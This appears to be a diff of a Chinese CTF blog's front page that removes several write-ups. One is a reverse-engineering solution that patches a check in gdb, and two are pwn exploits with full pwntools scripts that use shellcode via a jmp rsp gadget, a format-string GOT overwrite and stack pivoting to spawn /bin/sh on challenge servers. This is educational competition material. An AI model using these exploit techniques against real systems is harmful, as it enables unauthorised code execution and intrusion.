-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">key1=[<span class="number">36</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">54</span>, <span class="number">101</span>, <span class="number">7</span>, <span class="number">39</span>, <span class="number">38</span>, <span class="number">45</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">101</span>, <span class="number">3</span>, <span class="number">45</span>, <span class="number">22</span>, <span class="number">2</span>, <span class="number">21</span>, <span class="number">3</span>, <span class="number">101</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">68</span>, <span class="number">68</span>, <span class="number">1</span>, <span class="number">68</span>, <span class="number">43</span>]</span><br><span class="line">key2=<span class="string">&quot;L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A_&#123;FL4G&#125;_W0nt_b3_3X4ctly_th4t_345y_t0_c4ptur3_H0wev3r_1T_w1ll_b3_C00l_1F_Y0u_g0t_1t&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i in key1:</span><br><span class="line">	flag+=key2[i]</span><br><span class="line">print(flag)</span><br><span class="line"><span class="number">123456</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/../images/c-%E9%80%86%E5%90%91/6f84b0a555844d81b80a920d0bed2ee2.png" alt="在这里插入图片描述"></p>
-<p>.<br>.<br>总结：</p>
-<blockquote>
-<p>1：<br>(这里积累第一个经验) 第一个红框中把用户命令行输入的a2赋值给了v3。 第二个红框用的是cout函数，输出Usage这个字符串。<br>第三个红框不明觉厉。 第四个红框allocator(&amp;v13, a2, a3);应该是把a2的内容赋值给了v13。<br>第五个红框basic_string(v12, a2[1], &amp;v13);应该是把v13赋值给了V12。<br>第六、七个红框应该是v11取v12字符串的开头begin(v12)。 第八、九个红框应该是v14取v12的结尾end(v12)。</p>
-</blockquote>
-<blockquote>
-<p>2：<br>(这里积累第二个经验)<br>这里第一个红框sub_400D3D函数是取v11和v14比较，v14前面说过取输入字符串最后一个字符，而v11在第二个红框中sub_400D7A(v11)是向后取v11一个字符，所以这个if是判断当前字符是否为输入的最后一个字符，如果是就跳出循环。</p>
-</blockquote>
-<blockquote>
-<p>3：<br>(这里积累第三个经验) 这里有个align 8，align num是让后面的字节都对齐num，也就是这里都对齐8才对，中间补7个0。可是这里下一个数和上一个数明明间隔4而已！后来查了很多资料才发现是IDA自动把多个0判断成对齐操作了，这里align 8是因为前面dd 24h中本来是db 24 0 0 0 然后后面一个双字是dd 0 也就是db 0 0 0 0，IDA把这连着的7个0当成了间隔，那上一个数和下一个数间隔就是8了，所以IDA生成了align 8。我们只要鼠标右键undefine或把上面的dd 24改一下数据大小即可重定义align 8，重新生成数据了。(前面的align 20h 也是同样的道理)</p>
-</blockquote>
-<blockquote>
-<p>4：<br>(这里积累第四个经验)<br>IDA库函数Dword是以当前地址向后四个作为Dword数据，所以我们地址要addr+4*i来保持4的间隔。(0x60213c-0x6020c0)&gt;&gt;2是因为地址之间以4为一个单位，&gt;&gt;2在前面博客中总结过就是除4且保留整数部分。</p>
-</blockquote>
-<p>解毕！敬礼！</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/25/%E8%B0%83%E8%AF%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/Dvgd.jpg">
-      <meta itemprop="name" content="Dvgd">
-      <meta itemprop="description" content="Welcome to my blog.">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dvgd">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/07/25/%E8%B0%83%E8%AF%95/" class="post-title-link" itemprop="url">调试</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-07-25 21:24:04 / 修改时间：21:25:09" itemprop="dateCreated datePublished" datetime="2023-07-25T21:24:04+08:00">2023-07-25</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="CTF-攻防世界-Reverse-simple-check-100"><a href="#CTF-攻防世界-Reverse-simple-check-100" class="headerlink" title="CTF-攻防世界-Reverse-(simple-check-100)"></a>CTF-攻防世界-Reverse-(simple-check-100)</h1><h2 id="simple-check-100"><a href="#simple-check-100" class="headerlink" title="simple-check-100"></a>simple-check-100</h2><h3 id="分析文件"><a href="#分析文件" class="headerlink" title="分析文件"></a>分析文件</h3><p>下载附件解压之后发现有三个文件夹前面两个是elf文件（linux），还有一个exe文件(windows)</p>
-<p><img src="/../images/%E8%B0%83%E8%AF%95/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzI1MjIwNA==,size_16,color_FFFFFF,t_70.png" alt="img"></p>
-<p><img src="/../images/%E8%B0%83%E8%AF%95/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzI1MjIwNA==,size_16,color_FFFFFF,t_70-16902914646111.png" alt="img"></p>
-<p><img src="/../images/%E8%B0%83%E8%AF%95/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzI1MjIwNA==,size_16,color_FFFFFF,t_70-16902914646112.png" alt="img"></p>
-<p>不太明白 为什么要给两个，先不管了 先来在windows下分析一下.exe文件</p>
-<h3 id="使用IDA静态分析"><a href="#使用IDA静态分析" class="headerlink" title="使用IDA静态分析"></a>使用IDA静态分析</h3><p>定位到主函数 main</p>
-<p><img src="/../images/%E8%B0%83%E8%AF%95/20200907212354184.png" alt="img"></p>
-<p>大概流程是这样的将用户输入的key值，使用check_key（）函数检查之后如果为真就执行下面的函数</p>
-<p><img src="/../images/%E8%B0%83%E8%AF%95/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzI1MjIwNA==,size_16,color_FFFFFF,t_70-16902914646123.png" alt="img"></p>
-<p>猜测这个函数应该就是输出flag的</p>
-<p>很显然 我们只需要在程序执行完check_key函数，返回时</p>
-<p><img src="/../images/%E8%B0%83%E8%AF%95/20200907212353697.png" alt="img"></p>
-<p>也就是在这个位置 修改eax的值 使其校验为真 直接执行后面的函数</p>
-<h3 id="Windows下使用IDA进行动态调试"><a href="#Windows下使用IDA进行动态调试" class="headerlink" title="Windows下使用IDA进行动态调试"></a>Windows下使用IDA进行动态调试</h3><p>设置断点 两个</p>
-<p>第一个 004015A4 （这个位置修改eax寄存器值）</p>
-<p>第二个 004015B3 （让程序停下来）</p>
-<p><img src="/../images/%E8%B0%83%E8%AF%95/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzI1MjIwNA==,size_16,color_FFFFFF,t_70-16902914646124.png" alt="img"></p>
-<p>继续执行</p>
-<p><img src="/../images/%E8%B0%83%E8%AF%95/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzI1MjIwNA==,size_16,color_FFFFFF,t_70-16902914646125.png" alt="img"></p>
-<p>得到 乱码 没法解决</p>
-<p>只能去linux上跑elf文件了</p>
-<h3 id="linux-gdb-动态调试"><a href="#linux-gdb-动态调试" class="headerlink" title="linux gdb 动态调试"></a>linux gdb 动态调试</h3><p><strong>安装gdb</strong></p>
-<blockquote>
-<p>apt-get install gdb</p>
-</blockquote>
-<p><strong>安装gdb-peda</strong></p>
-<blockquote>
-<p>git clone <a target="_blank" rel="noopener" href="https://github.com/longld/peda.git">https://github.com/longld/peda.git</a> ~&#x2F;peda</p>
-<p>echo “source ~&#x2F;peda&#x2F;peda.py” &gt;&gt; ~&#x2F;.gdbinit</p>
-</blockquote>
-<p>选择64位的文件</p>
-<p>开始</p>
-<blockquote>
-<p>gdb task9_x86_64_46d01fe312d35ecf69c4ff8ab8ace75d080891dc</p>
-</blockquote>
-<p>设置断点在main函数入口处</p>
-<blockquote>
-<p>b main</p>
-</blockquote>
-<p>开始运行</p>
-<blockquote>
-<p>r</p>
-</blockquote>
-<p><img src="/../images/%E8%B0%83%E8%AF%95/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzI1MjIwNA==,size_16,color_FFFFFF,t_70-16902914646126.png" alt="img"></p>
-<p>到这里继续单步执行</p>
-<blockquote>
-<p>n</p>
-</blockquote>
-<p>接下来一直单步执行 到达输入key的地方 输入key值 继续</p>
-<p><img src="/../images/%E8%B0%83%E8%AF%95/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzI1MjIwNA==,size_16,color_FFFFFF,t_70-16902914646127.png" alt="img"></p>
-<p>接下来继续单步执行 直到test eax,eax处</p>
-<p>查看eax寄存器值</p>
-<blockquote>
-<p>i r eax</p>
-</blockquote>
-<p>修改eax寄存器值</p>
-<blockquote>
-<p>set $eax&#x3D;1</p>
-</blockquote>
-<p><img src="/../images/%E8%B0%83%E8%AF%95/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzI1MjIwNA==,size_16,color_FFFFFF,t_70-16902914646128.png" alt="img"></p>
-<p>直接运行至程序结束</p>
-<blockquote>
-<p>c</p>
-</blockquote>
-<p>得到flag </p>
-<p><img src="/../images/%E8%B0%83%E8%AF%95/20200907212353631.png" alt="img"></p>
-<p><strong>flag:</strong></p>
-<blockquote>
-<p><strong>flag_is_you_know_cracking!!!</strong></p>
-</blockquote>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/19/sandbox/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/Dvgd.jpg">
-      <meta itemprop="name" content="Dvgd">
-      <meta itemprop="description" content="Welcome to my blog.">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dvgd">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/07/19/sandbox/" class="post-title-link" itemprop="url">sandbox</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-07-19 13:22:09 / 修改时间：13:24:54" itemprop="dateCreated datePublished" datetime="2023-07-19T13:22:09+08:00">2023-07-19</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="Random（绕沙箱加短脚本）"><a href="#Random（绕沙箱加短脚本）" class="headerlink" title="Random（绕沙箱加短脚本）"></a>Random（绕沙箱加短脚本）</h3><blockquote>
-<p>程序禁了 execv，没开 NX，有 ‘jmp rsp’ 这么一个 gadget，所以往栈上写的 shellcode 是可执行且能利用到的。<br>很明显，是要读flag<br>先用pwn生成一个cat<br>用ljust左对齐抬高到0x28<br>返回地址为jmp rsp<br>填充 asm(‘sub rsp,0x30;call rsp’)<br>那么返回的时候，执行jmp rsp，即asm(‘sub rsp,0x30;call rsp’)，然后cat flag<br>太妙了！！！第一次见到这样的！</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">jmp=<span class="number">0x40094E</span></span><br><span class="line">shellcode=asm(shellcraft.cat(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line">shellcode=shellcode.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload=shellcode+p64(jmp)+asm(<span class="string">&#x27;sub rsp,0x30;call rsp&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.nlark.com/yuque/0/2023/png/29466846/1681727956589-d7bb4c33-467c-40a0-b3dc-8d8ee7bec955.png#averageHue=%23030202&clientId=uddbdf830-9bbd-4&from=paste&height=665&id=u244b8bdf&name=image.png&originHeight=998&originWidth=1331&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=82620&status=done&style=none&taskId=u2b5945ba-fda3-4f65-a5a9-5e6b8d3abc2&title=&width=887.3333333333334" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/29466846/1681727966018-1eda846a-bdde-4eb1-b528-c36331666492.png#averageHue=%23070604&clientId=uddbdf830-9bbd-4&from=paste&height=142&id=u9f26ea37&name=image.png&originHeight=213&originWidth=838&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=17430&status=done&style=none&taskId=uabe194ae-9f33-4f93-b9bc-bb83889f606&title=&width=558.6666666666666" alt="image.png"></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="number">28257</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./RANDOM&#x27;</span>)</span><br><span class="line"></span><br><span class="line">jmp=<span class="number">0x40094e</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;num:\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    s=p.recvline().decode()</span><br><span class="line">    <span class="keyword">if</span> s == <span class="string">&#x27;good guys\n&#x27;</span>:</span><br><span class="line">        shellcode=asm(shellcraft.cat(<span class="string">&#x27;flag&#x27;</span>))</span><br><span class="line">        shellcode=shellcode.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">        pay=shellcode+p64(jmp)+asm(<span class="string">&#x27;sub rsp,0x30;call rsp&#x27;</span>)</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;door\n&#x27;</span>,pay)</span><br><span class="line">        p.interactive()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/18/Ubuntu%E5%AE%89%E8%A3%8532%E4%BD%8D%E7%8E%AF%E5%A2%83/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/Dvgd.jpg">
-      <meta itemprop="name" content="Dvgd">
-      <meta itemprop="description" content="Welcome to my blog.">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dvgd">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/07/18/Ubuntu%E5%AE%89%E8%A3%8532%E4%BD%8D%E7%8E%AF%E5%A2%83/" class="post-title-link" itemprop="url">Ubuntu安装32位环境</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-07-18 17:23:04 / 修改时间：17:24:00" itemprop="dateCreated datePublished" datetime="2023-07-18T17:23:04+08:00">2023-07-18</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="ubuntu20-04-设置32位运行环境"><a href="#ubuntu20-04-设置32位运行环境" class="headerlink" title="ubuntu20.04 设置32位运行环境"></a>ubuntu20.04 设置32位运行环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt install libc6:i386 libstdc++6:i386</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt install libncurses5-dev lib32z1</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/14/%E6%A0%88%E8%BF%81%E7%A7%BB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/Dvgd.jpg">
-      <meta itemprop="name" content="Dvgd">
-      <meta itemprop="description" content="Welcome to my blog.">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Dvgd">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/07/14/%E6%A0%88%E8%BF%81%E7%A7%BB/" class="post-title-link" itemprop="url">栈迁移</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-07-14 16:18:26 / 修改时间：16:20:17" itemprop="dateCreated datePublished" datetime="2023-07-14T16:18:26+08:00">2023-07-14</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>[HDCTF 2023]KEEP ON </p>
-<p>本题存在两种解法：<br><code>栈迁移</code>解法以及<code>格式化字符串</code>劫持printf_got。</p>
-<p>主要的函数如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 vuln()</span><br><span class="line">&#123;</span><br><span class="line">  char s[80]; // [rsp+0h] [rbp-50h] BYREF</span><br><span class="line"></span><br><span class="line">  memset(s, 0, sizeof(s));</span><br><span class="line">  puts(&quot;please show me your name: &quot;);</span><br><span class="line">  read(0, s, 0x48uLL);</span><br><span class="line">  printf(&quot;hello,&quot;);</span><br><span class="line">  printf(s);</span><br><span class="line">  puts(&quot;keep on !&quot;);</span><br><span class="line">  read(0, s, 0x60uLL);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>存在格式化字符串漏洞，使用fmtstr_payload可以替换<code>printf_got</code>为<code>system_plt</code>。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class="line">system_plt = elf.plt[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(6, &#123;printf_got: system_plt&#125;)</span><br></pre></td></tr></table></figure>
-
-
-
-<p>然后重新返回vuln函数，写入binsh即可getshell。<br>完整EXP：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from PwnModules import *</span><br><span class="line"></span><br><span class="line">#io = process(&#x27;./hdctf&#x27;)</span><br><span class="line">io = remote(&#x27;node4.anna.nssctf.cn&#x27;, 28144)</span><br><span class="line">elf = ELF(&#x27;./hdctf&#x27;)</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&#x27;name: \n&#x27;)</span><br><span class="line"></span><br><span class="line">printf_got = elf.got[&#x27;printf&#x27;]</span><br><span class="line">system_plt = elf.plt[&#x27;system&#x27;]</span><br><span class="line">vuln = elf.sym[&#x27;vuln&#x27;]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(6, &#123;printf_got: system_plt&#125;)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload_ret = b&#x27;A&#x27; * (0x50 + 0x08) + p64(vuln)</span><br><span class="line">io.recvuntil(b&#x27;keep on !\n&#x27;)</span><br><span class="line">io.send(payload_ret)</span><br><span class="line">io.recvuntil(b&#x27;name: \n&#x27;)</span><br><span class="line">io.send(b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<p>切记不能使用sendline，因为本题限制了Payload长度，而sendline会附加换行符，导致发送的Payload出现问题。</p>
-<p>栈迁移解法：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">from PwnModules import *</span><br><span class="line"></span><br><span class="line">#io = process(&#x27;./hdctf&#x27;)</span><br><span class="line">io = remote(&#x27;node4.anna.nssctf.cn&#x27;, 28031)</span><br><span class="line">elf = ELF(&#x27;./hdctf&#x27;)</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&#x27;name: \n&#x27;)</span><br><span class="line"></span><br><span class="line">fmtpayload = b&#x27;%16$p&#x27;</span><br><span class="line">io.send(fmtpayload)</span><br><span class="line">io.recvuntil(b&#x27;hello,0x&#x27;)</span><br><span class="line"></span><br><span class="line">old_rbp = int(io.recv(12),16)</span><br><span class="line"></span><br><span class="line">log.success(&#x27;RBP Addr: &#x27; + (hex(old_rbp)))</span><br><span class="line"></span><br><span class="line">leave_ret = 0x4007F2</span><br><span class="line">rdi = 0x4008D3</span><br><span class="line">system = elf.plt[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">Target_Addr = old_rbp - 0x60 - 0x08</span><br><span class="line"></span><br><span class="line"># RDI will pop binsh addr as system&#x27;s arg</span><br><span class="line"># Offset : 0x08</span><br><span class="line">Payload = p64(rdi)</span><br><span class="line"># Offset : 0x08 + 0x08</span><br><span class="line">Payload += p64(Target_Addr + 0x8 + 0x18)</span><br><span class="line"># Offset : 0x08 + 0x10</span><br><span class="line">Payload += p64(system)</span><br><span class="line"># Offset : 0x08 + 0x18</span><br><span class="line">Payload += b&#x27;/bin/sh\x00&#x27;</span><br><span class="line"># Fill the Payload to 0x50.</span><br><span class="line">Payload = Payload.ljust(0x50, b&#x27;a&#x27;)</span><br><span class="line"># The Leave Ret cmd&#x27;s ret addr.</span><br><span class="line">Payload += p64(Target_Addr)</span><br><span class="line"># The Leave Ret</span><br><span class="line">Payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.recvuntil(b&#x27;keep on !\n&#x27;)</span><br><span class="line">io.send(Payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<p>首先我们使用gdb动态调试获取rbp的偏移。<br><img src="/../images/%E6%A0%88%E8%BF%81%E7%A7%BB/70c3624501.jpg" alt="NSSIMAGE"><br>因此偏移就是16。<br>使用%16$p获取rbp。<br><img src="/../images/%E6%A0%88%E8%BF%81%E7%A7%BB/55bd430249.jpg" alt="NSSIMAGE"><br>计算rbp与s的偏移。<br>结果为0x60，因此我们需要将栈迁移到rbp - 0x60 - 0x08的位置。<br>减去0x08是为了覆盖掉原先的返回地址。<br>然后我们计算出&#x2F;bin&#x2F;sh的偏移，这正好是我的EXP中的注释写了的东西。<br>写完之后就没什么好说的了，直接打就行了。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1261,14 +1219,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-count">52</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">10</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
